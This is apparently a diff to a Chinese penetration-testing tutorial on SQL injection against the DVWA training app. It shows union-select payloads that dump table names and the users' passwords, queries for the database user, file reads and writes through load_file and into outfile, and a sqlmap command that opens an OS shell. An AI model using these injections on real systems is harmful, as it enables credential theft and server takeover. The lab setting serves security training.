@@ -46,7 +46,29 @@ select table_name,column_name from information_schema.columns; 查询全表对�
 6、查找表对应的字段?id=1' union select table_name,column_name from information_schema.columns#  
 7、查最终数据 ?id=1' union select user,password from dvwa.users#  
 8、判断数据库版本1' and substring(@@version,1,1)=4# 如果返回正常结果，说明数据库版本是4.  
-
+9、查询当前注入点的数据库用户union select user(),2#
+```text
+ID: 1' union select user(),2#
+First name: admin
+Surname: admin
+ID: 1' union select user(),2#
+First name: root@localhost
+Surname: 2
+```
+10、读文件，写文件，没有配置–secure-file-priv
+```text
+show variables like '%secure%';
+打开mysql的配置文件my.ini 然后在末尾加上secure-file-priv="" 重启就行了
+```
+```text
+SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,load_file('c:\\test.txt')#'
+select '123' into OUTFILE 'c:/123.txt';
+```
+11、使用sqlmap写入shell
+```text
+C:\soft\sqlmap>python sqlmap.py -u "http://192.168.1.9/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" -p "id" --cookie "security=low; PHPSESSID=1n3rvc90rbafotfo5r0tmn80l1" -T users
+ -C "user,password" --os-shell
+```
 ***
 不定期分享一些python开发,逆向破解、渗透测试相关文章,欢迎大家关注.  
 ![微信公众号](../gongzhonghao.jpg)
